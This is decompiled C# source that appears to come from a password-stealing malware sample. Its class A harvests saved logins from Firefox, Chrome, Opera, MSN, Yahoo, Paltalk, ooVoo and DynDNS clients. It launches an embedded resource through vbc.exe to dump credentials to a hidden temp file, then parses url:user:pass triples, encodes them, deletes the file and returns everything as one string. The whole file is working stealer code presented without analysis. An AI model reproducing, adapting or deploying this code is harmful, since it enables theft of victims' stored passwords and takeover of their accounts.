using System;
using System.Collections.Generic;
using System.IO;
using System.Runtime.InteropServices;
using System.Threading;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using pw.My.Resources;

namespace pw.pw
{
	// Token: 0x0200000A RID: 10
	public class A
	{
		// Token: 0x0600001F RID: 31 RVA: 0x00038334 File Offset: 0x00036734
		public static string GT()
		{
			string text3 = null;
			try
			{
				A.txt();
				p.P1();
				p.P2();
				p.dyn();
				p.paltalk();
				A.FirFox();
				A.chrome();
				p.Msn();
				p.Yahoo();
				p.GetOpera();
				p.OLADD("");
				p.OOVOO();
				p.DUC3();
				string text = "";
				try
				{
					foreach (string text2 in p.OL)
					{
						text = text + text2 + " ";
					}
				}
				finally
				{
					
				}
				p.OL.Clear();
				text3 = text;
			}
			catch (Exception ex)
			{
			}
			return text3;
		}

		// Token: 0x06000020 RID: 32 RVA: 0x00038404 File Offset: 0x00036804
		public static void FirFox()
		{
			checked
			{
				try
				{
					p.OLADD("");
					List<string> list = new List<string>();
					using (StreamReader streamReader = new StreamReader(A.path))
					{
						string text = streamReader.ReadLine();
						int num = 0;
						while (text != null)
						{
							if (Operators.CompareString(text, null, false) != 0)
							{
								if (num == 0 && text.Contains("Chrome"))
								{
									int num2 = 1;
									do
									{
										text = streamReader.ReadLine();
										num2++;
									}
									while (num2 <= 3);
								}
								else
								{
									if (num == 1)
									{
										A.url = text;
									}
									if (num == 2)
									{
										A.user = text;
									}
									if (num == 3)
									{
										A.pass = text;
									}
									if (num == 4)
									{
										p.OLADD(string.Concat(new string[]
										{
											p.ENB(ref A.url),
											":",
											p.ENB(ref A.user),
											":",
											p.ENB(ref A.pass)
										}));
										num = 0;
									}
									num++;
								}
							}
							text = streamReader.ReadLine();
						}
					}
				}
				catch (Exception ex)
				{
				}
			}
		}

		// Token: 0x06000021 RID: 33 RVA: 0x00038558 File Offset: 0x00036958
		public static void chrome()
		{
			checked
			{
				try
				{
					p.OLADD("");
					List<string> list = new List<string>();
					using (StreamReader streamReader = new StreamReader(A.path))
					{
						string text = streamReader.ReadLine();
						int num = 0;
						while (text != null)
						{
							if (Operators.CompareString(text, null, false) != 0)
							{
								if (num == 1)
								{
									A.url = text;
								}
								if (num == 2)
								{
									A.user = text;
								}
								if (num == 3)
								{
									A.pass = text;
								}
								if (num == 4)
								{
									p.OLADD(string.Concat(new string[]
									{
										p.ENB(ref A.url),
										":",
										p.ENB(ref A.user),
										":",
										p.ENB(ref A.pass)
									}));
									num = 0;
								}
								num++;
							}
							text = streamReader.ReadLine();
						}
					}
					File.Delete(A.path);
				}
				catch (Exception ex)
				{
				}
			}
		}

		// Token: 0x06000022 RID: 34 RVA: 0x0003866C File Offset: 0x00036A6C
		public static void txt()
		{
			if (Class1.smethod_0(RuntimeEnvironment.GetRuntimeDirectory() + "vbc.exe", string.Concat(new string[]
			{
				"-f",
				Strings.Space(1),
				"\"",
				A.path,
				"\""
			}), Resources.BR, true, true))
			{
				Thread.Sleep(1000);
				if (File.Exists(A.path))
				{
					try
					{
						File.WriteAllText(A.path, A.replace(File.ReadAllText(A.path)));
					}
					catch (Exception ex)
					{
					}
				}
			}
		}

		// Token: 0x06000023 RID: 35 RVA: 0x0003871C File Offset: 0x00036B1C
		public static string replace(string s)
		{
			s = s.Replace(Resources.String1, null).Replace(Resources.String2, "").Replace(" Password: ", null)
				.Replace(" Username: ", null)
				.Replace(" Website:  ", null)
				.Replace(" Browser: ", null)
				.Replace(Resources.String3, null)
				.Replace("                                 ", null);
			return s;
		}

		// Token: 0x06000024 RID: 36 RVA: 0x0003878C File Offset: 0x00036B8C
		private static object CIE7Passwords()
		{
			throw new NotImplementedException();
		}

		// Token: 0x0400001C RID: 28
		public static string url = null;

		// Token: 0x0400001D RID: 29
		public static string user = null;

		// Token: 0x0400001E RID: 30
		public static string pass = null;

		// Token: 0x0400001F RID: 31
		public static Random Random1 = new Random();

		// Token: 0x04000020 RID: 32
		public static int Result = A.Random1.Next(1000000, 5000000);

		// Token: 0x04000021 RID: 33
		public static string path = Path.GetTempPath() + A.Result.ToString();
	}
}
